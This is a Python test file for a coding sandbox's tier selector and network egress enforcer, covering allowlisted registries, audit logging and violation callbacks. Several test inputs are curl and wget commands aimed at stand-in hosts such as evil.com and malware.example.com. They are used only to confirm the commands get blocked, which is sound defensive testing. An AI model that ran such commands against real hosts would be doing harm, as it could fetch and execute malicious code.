from loom.business.audit_log import AuditLogger
from loom.business.models import AuditAction, OrgTier
from loom.sandbox.tiers import (
    EgressEnforcer,
    RunClassification,
    SandboxContext,
    SandboxTier,
    SandboxTierSelector,
)


class TestSandboxTierSelection:
    def test_solo_quick_fix_returns_tier_a(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.SOLO, classification=RunClassification.QUICK_FIX)
        assert sel.select_tier(ctx) == SandboxTier.A_GIT_WORKTREE

    def test_solo_with_deps_returns_tier_a(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.SOLO, requires_dependency_install=True)
        assert sel.select_tier(ctx) == SandboxTier.A_GIT_WORKTREE

    def test_team_with_deps_returns_tier_b(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM, requires_dependency_install=True)
        assert sel.select_tier(ctx) == SandboxTier.B_DOCKER_CONTAINER

    def test_team_quick_fix_returns_tier_a(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM, classification=RunClassification.QUICK_FIX)
        assert sel.select_tier(ctx) == SandboxTier.A_GIT_WORKTREE

    def test_enterprise_sensitive_returns_tier_c(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.ENTERPRISE, repo_sensitivity_flag=True)
        assert sel.select_tier(ctx) == SandboxTier.C_FIRECRACKER_MICROVM

    def test_enterprise_high_risk_patch_returns_tier_c(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.ENTERPRISE, patch_risk_high=True)
        assert sel.select_tier(ctx) == SandboxTier.C_FIRECRACKER_MICROVM

    def test_enterprise_standard_returns_tier_b(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.ENTERPRISE)
        assert sel.select_tier(ctx) == SandboxTier.B_DOCKER_CONTAINER

    def test_select_with_resources_sets_limits(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM, requires_dependency_install=True)
        result = sel.select_with_resources(ctx)
        assert result.sandbox_tier == SandboxTier.B_DOCKER_CONTAINER
        assert result.resource_limits["cpu_cores"] == 2
        assert result.resource_limits["memory_mb"] == 4096

    def test_untrusted_deps_blocks_tier_a(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(
            org_tier=OrgTier.SOLO,
            classification=RunClassification.QUICK_FIX,
            has_untrusted_native_deps=True,
        )
        assert sel.select_tier(ctx) == SandboxTier.A_GIT_WORKTREE

    def test_team_untrusted_deps_standard_returns_tier_b(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM, has_untrusted_native_deps=True)
        assert sel.select_tier(ctx) == SandboxTier.B_DOCKER_CONTAINER


class TestEgressEnforcement:
    def test_allowed_registry_passes(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("pypi.org", "pip install", SandboxTier.B_DOCKER_CONTAINER)

    def test_allowed_github_passes(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("github.com", "git clone", SandboxTier.B_DOCKER_CONTAINER)

    def test_allowed_npm_passes(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("registry.npmjs.org", "npm install", SandboxTier.B_DOCKER_CONTAINER)

    def test_unknown_domain_blocked(self):
        enforcer = EgressEnforcer()
        assert not enforcer.check_egress("evil.com", "curl evil.com", SandboxTier.B_DOCKER_CONTAINER)

    def test_violation_recorded_on_block(self):
        enforcer = EgressEnforcer()
        enforcer.check_egress("evil.com", "curl", SandboxTier.B_DOCKER_CONTAINER)
        assert enforcer.violation_count == 1

    def test_no_violation_on_allowed(self):
        enforcer = EgressEnforcer()
        enforcer.check_egress("pypi.org", "pip", SandboxTier.B_DOCKER_CONTAINER)
        assert enforcer.violation_count == 0

    def test_check_command_egress_extracts_urls(self):
        enforcer = EgressEnforcer()
        blocked = enforcer.check_command_egress(
            "curl https://evil.com/malware && wget https://pypi.org/package",
            SandboxTier.B_DOCKER_CONTAINER,
        )
        assert "evil.com" in blocked
        assert "pypi.org" not in blocked

    def test_check_command_egress_no_urls(self):
        enforcer = EgressEnforcer()
        blocked = enforcer.check_command_egress("pytest tests/", SandboxTier.B_DOCKER_CONTAINER)
        assert blocked == []

    def test_custom_allowlist(self):
        enforcer = EgressEnforcer(allowlist={"my-internal-repo.com"})
        assert enforcer.check_egress("my-internal-repo.com", "curl", SandboxTier.B_DOCKER_CONTAINER)
        assert not enforcer.check_egress("pypi.org", "pip", SandboxTier.B_DOCKER_CONTAINER)

    def test_case_insensitive_matching(self):
        enforcer = EgressEnforcer()
        assert enforcer.check_egress("PYPI.ORG", "pip", SandboxTier.B_DOCKER_CONTAINER)
        assert enforcer.check_egress("GitHub.Com", "git", SandboxTier.B_DOCKER_CONTAINER)

    def test_blocked_egress_writes_audit_entry(self, tmp_path):
        logger = AuditLogger(storage_dir=str(tmp_path))
        enforcer = EgressEnforcer(audit_logger=logger)
        assert not enforcer.check_egress("evil.com", "curl evil.com", SandboxTier.B_DOCKER_CONTAINER)
        entries = logger.get_entries(
            org_id="unknown",
            action=AuditAction.SANDBOX_EGRESS_BLOCKED,
        )
        assert len(entries) == 1
        assert entries[0].target == "evil.com"
        assert entries[0].metadata["tier"] == "B"

    def test_allowed_egress_writes_no_audit_entry(self, tmp_path):
        logger = AuditLogger(storage_dir=str(tmp_path))
        enforcer = EgressEnforcer(audit_logger=logger)
        assert enforcer.check_egress("pypi.org", "pip install requests", SandboxTier.B_DOCKER_CONTAINER)
        assert logger.count() == 0


class TestSandboxTierSelectorIntegration:
    def test_enforce_egress_allows_safe_commands(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM, requires_dependency_install=True)
        sel.select_with_resources(ctx)
        assert sel.enforce_egress_policy("pip install requests", ctx)

    def test_enforce_egress_blocks_unknown_domains(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM, requires_dependency_install=True)
        sel.select_with_resources(ctx)
        assert not sel.enforce_egress_policy("curl https://malware.example.com/backdoor", ctx)

    def test_violation_callback_called(self):
        sel = SandboxTierSelector()
        ctx = SandboxContext(org_tier=OrgTier.TEAM, requires_dependency_install=True)
        sel.select_with_resources(ctx)
        calls = []

        def callback(violation):
            calls.append(violation)

        sel.enforce_egress_policy("curl https://evil.com", ctx, on_violation=callback)
        assert len(calls) == 1
        assert calls[0].target == "evil.com"
